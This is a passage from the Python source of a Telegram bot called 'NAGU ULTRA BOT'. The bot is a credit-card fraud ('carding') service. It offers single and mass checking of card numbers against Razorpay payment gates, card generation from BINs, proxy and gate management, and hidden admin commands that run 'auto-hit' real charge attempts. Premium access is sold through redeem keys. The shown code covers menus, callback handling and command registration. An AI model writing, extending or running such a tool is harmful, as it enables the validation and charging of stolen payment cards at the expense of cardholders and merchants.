            cap     = f"{e('folder')} <b>All Results</b> — {len(all_lines)} lines"
        else:
            cards_list = results.get(dl_type, [])
            if not cards_list:
                await q.answer(f"No {dl_type} cards.", show_alert=True); return
            content = "\n".join(cards_list)
            fname   = f"{dl_type}_{target_uid}.txt"
            cap     = f"{e('folder')} <b>{dl_type.title()} Cards</b> — {len(cards_list)} cards"
        await _send_file(q.message, content, fname, cap)
        return

    # ── Keyboard nav ──────────────────────────────────────
    if data == "kb_rz":
        await q.edit_message_text(
            f"{e('card')} <b>Single CC Check</b>\n\n"
            f"  cmd · <code>/rz cc|mm|yy|cvv</code>\n"
            f"  txt · reply to a card with /rz\n"
            f"  ex · <code>/rz 4111111111111111|12|26|123</code>",
            parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[btn(f"{e('back')} Back","back_main")]]))
        return
    if data == "kb_mrz":
        await q.edit_message_text(
            f"{e('mass')} <b>Mass Razorpay Check</b> — Premium\n\n"
            f"  cmd · <code>/mrz</code>\n"
            f"  txt · reply or attach .txt with /mrz\n"
            f"  ex · /mrz 4111....|12|30|123\n\n"
            f"{e('star')} Max: <code>{MAX_MRZ_CARDS:,} cards</code>",
            parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[btn(f"{e('back')} Back","back_main")]]))
        return
    if data == "kb_bin":
        await q.edit_message_text(
            f"{e('bin')} <b>BIN Lookup</b>\n\n"
            f"  cmd · <code>/bin 438854</code>\n"
            f"  ex · <code>/bin 220040</code>",
            parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[btn(f"{e('back')} Back","back_main")]]))
        return
    if data == "kb_help":
        await q.edit_message_text(
            f"{e('info')} <b>Help Menu</b>\n\n"
            f"{e('star')} /rz cc|mm|yy|cvv — Check CC\n"
            f"{e('mass')} /mrz — Mass check (premium)\n"
            f"{e('bin')} /bin 438854 — BIN lookup\n"
            f"{e('key')} /redeem KEY — Activate plan\n"
            f"{e('user')} /profile — Your profile\n"
            f"{e('plan')} /plans — View plans\n"
            f"{e('stop')} /mrzstop — Stop mass job\n"
            f"{e('card')} /gen BIN N — Generate cards\n"
            f"{e('file')} /split N — Split file",
            parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([
                [btn(f"{e('back')} Back","back_main")],
                [InlineKeyboardButton(f"{e('channel')} Channel", url=CHANNEL_LINK),
                 InlineKeyboardButton(f"{e('group')} Group", url=GROUP_LINK)],
            ]))
        return
    if data in ("kb_plans", "back_plans"):
        await q.edit_message_text(
            f"{e('plan')} <b>Plans</b>\n\n"
            f"{e('user')} Free — /rz /bin /start /profile\n\n"
            f"{e('star')} Premium\n"
            f"  ► /mrz up to 6,000 cards\n"
            f"  ► /gen card generation\n"
            f"  ► /split file splitting\n"
            f"  ► {e('infinity')} unlimited checks\n\n"
            f"{e('key')} /redeem KEY to activate",
            parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([
                [btn(f"{e('key')} Buy Premium", "plans_buy")],
                [btn(f"{e('back')} Back", "back_main")],
            ]))
        return
    if data == "kb_profile":
        ud  = await redis.hgetall(f"bot:u:{uid}")
        rle = await get_role(uid)
        pln = ud.get("plan_name","Free"); exp = ud.get("plan_exp","")
        exp_str = "—"
        if exp:
            try:
                rem = float(exp) - time.time()
                if rem > 0: d2, r2 = divmod(int(rem),86400); exp_str = f"{d2}d {r2//3600}h"
                else: exp_str = "Expired"
            except: pass
        await q.edit_message_text(
            f"{e('star')} <b>Profile</b>\n\n"
            f"  ► name · {safe(user.first_name)}\n"
            f"  ► id · <code>{uid}</code>\n"
            f"  ► rank · <b>{safe(rle)}</b>\n"
            f"  ► plan · <b>{safe(pln)}</b>\n"
            f"  ► exp · <code>{exp_str}</code>",
            parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[btn(f"{e('back')} Back","back_main")]]))
        return
    if data == "kb_stats":
        if not await is_sudo(uid): return
        hits = await redis.hget(RK_STATS,"total_hits") or "0"
        ch   = await redis.hget(RK_STATS,"total_charged") or "0"
        ap   = await redis.hget(RK_STATS,"total_approved") or "0"
        gen  = await redis.hget(RK_STATS,"total_generated") or "0"
        s    = await redis.llen(RK_SITES); p = await redis.llen(RK_PROXIES)
        await q.edit_message_text(
            f"{e('stats')} <b>Stats</b>\n\n"
            f"  Gates: {s} · Proxies: {p}\n"
            f"  Hits: {hits} · Charged: {ch}\n"
            f"  Approved: {ap} · Generated: {gen}",
            parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[btn(f"{e('back')} Back","back_main")]]))
        return
    if data == "kb_admin_panel":
        if not await is_sudo(uid): return
        await q.edit_message_text(
            f"{e('gear')} <b>Admin Panel</b>\n\n"
            f"Use /bhosade for full command list.",
            parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[btn(f"{e('back')} Back","back_main")]]))
        return
    if data == "back_main":
        auth  = await is_auth(uid)
        role  = await get_role(uid)
        kb    = kb_admin() if (is_admin(uid) or await is_sudo(uid)) else kb_main()
        await q.edit_message_text(
            f"{e('fire')} <b>NAGU ULTRA BOT</b>\n\n"
            f"{e('user')} <b>{safe(user.first_name)}</b> — <b>{safe(role)}</b>",
            parse_mode=ParseMode.HTML, reply_markup=kb)
        return

    # ── Sudo-only callback actions ─────────────────────────
    if not await is_sudo(uid):
        await q.answer("Access denied.", show_alert=True); return

    if data.startswith("fuck_"):
        amt = int(data.split("_")[1])
        await q.edit_message_text(
            f"{e('fire')} Starting real charge test ₹{amt//100}...",
            parse_mode=ParseMode.HTML)
        asyncio.create_task(run_autohit(q.message.chat_id, amt, ctx, False, user))
        return
    if data.startswith("auto_"):
        amt = int(data.split("_")[1])
        await q.edit_message_text(
            f"{e('bolt')} Starting auto-hit ₹{amt//100}...",
            parse_mode=ParseMode.HTML)
        asyncio.create_task(run_autohit(q.message.chat_id, amt, ctx, True, user))
        return
    if data.startswith("rmsite_"):
        idx = int(data.split("_")[1])
        sites = await redis.lrange(RK_SITES, 0, -1)
        if 0 <= idx < len(sites):
            await redis.lrem(RK_SITES, 0, sites[idx])
            await q.edit_message_text(f"{e('check')} Site #{idx+1} removed.", parse_mode=ParseMode.HTML)
        return
    if data.startswith("rmpxy_"):
        idx = int(data.split("_")[1])
        proxies = await redis.lrange(RK_PROXIES, 0, -1)
        if 0 <= idx < len(proxies):
            await redis.lrem(RK_PROXIES, 0, proxies[idx])
            await q.edit_message_text(f"{e('check')} Proxy #{idx+1} removed.", parse_mode=ParseMode.HTML)
        return
    if data.startswith("rmbin_"):
        idx = int(data.split("_")[1])
        bins = await redis.lrange(RK_BINS, 0, -1)
        if 0 <= idx < len(bins):
            await redis.lrem(RK_BINS, 0, bins[idx])
            await q.edit_message_text(f"{e('check')} BIN #{idx+1} removed.", parse_mode=ParseMode.HTML)
        return

# ═══════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════
def main() -> None:
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # ── Public commands ───────────────────────────────────
    app.add_handler(CommandHandler("start",   cmd_start))
    app.add_handler(CommandHandler("help",    cmd_help))
    app.add_handler(CommandHandler("cmds",    cmd_help))
    app.add_handler(CommandHandler("plans",   cmd_plans))
    app.add_handler(CommandHandler("redeem",  cmd_redeem))
    app.add_handler(CommandHandler("profile", cmd_profile))
    app.add_handler(CommandHandler("bin",     cmd_bin))

    # ── Free + premium commands ───────────────────────────
    app.add_handler(CommandHandler("rz",      cmd_rz))

    # ── PREMIUM ONLY ──────────────────────────────────────
    app.add_handler(CommandHandler("mrz",     cmd_mrz))
    app.add_handler(CommandHandler("mrzstop", cmd_mrzstop))
    app.add_handler(CommandHandler("gen",     cmd_gen))
    app.add_handler(CommandHandler("split",   cmd_split))

    # ── SUDO/ADMIN ONLY ───────────────────────────────────
    app.add_handler(CommandHandler("sudo",      cmd_sudo_add))
    app.add_handler(CommandHandler("unsudo",    cmd_unsudo))
    app.add_handler(CommandHandler("sudolist",  cmd_sudolist))
    app.add_handler(CommandHandler("ban",       cmd_ban))
    app.add_handler(CommandHandler("unban",     cmd_unban))
    app.add_handler(CommandHandler("banlist",   cmd_banlist))
    app.add_handler(CommandHandler("addplan",   cmd_addplan))
    app.add_handler(CommandHandler("genkey",    cmd_genkey))
    app.add_handler(CommandHandler("stats",     cmd_stats))
    app.add_handler(CommandHandler("addsite",   cmd_addsite))
    app.add_handler(CommandHandler("live",      cmd_live))
    app.add_handler(CommandHandler("checksite", cmd_checksite))
    app.add_handler(CommandHandler("rmsite",    cmd_rmsite))
    app.add_handler(CommandHandler("addpxy",    cmd_addpxy))
    app.add_handler(CommandHandler("proxy",     cmd_proxy))
    app.add_handler(CommandHandler("testpxy",   cmd_testpxy))
    app.add_handler(CommandHandler("rmpxy",     cmd_rmpxy))
    app.add_handler(CommandHandler("clrpxy",    cmd_clrpxy))
    app.add_handler(CommandHandler("addbim",    cmd_addbim))
    app.add_handler(CommandHandler("chkbim",    cmd_chkbim))
    app.add_handler(CommandHandler("rmbin",     cmd_rmbin))

    # ── COMPLETELY HIDDEN (sudo only, silent fail) ────────
    app.add_handler(CommandHandler("fuck",      cmd_fuck))
    app.add_handler(CommandHandler("autohit",   cmd_autohit))
    app.add_handler(CommandHandler("stoptest",  cmd_stop_test))
    app.add_handler(CommandHandler("bhosade",   cmd_bhosade))

    # ── Callbacks ─────────────────────────────────────────
    app.add_handler(CallbackQueryHandler(handle_callbacks))

    logger.info("══════════════════════════════════")
    logger.info("  NAGU ULTRA BOT v7.0 STARTING")
    logger.info(f"  Admin: {ADMIN_USER_ID} | Creator: {BOT_CREATOR}")
    logger.info(f"  Channel: {CHANNEL_LINK}")
    logger.info(f"  Group:   {GROUP_LINK}")
    logger.info("══════════════════════════════════")

    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
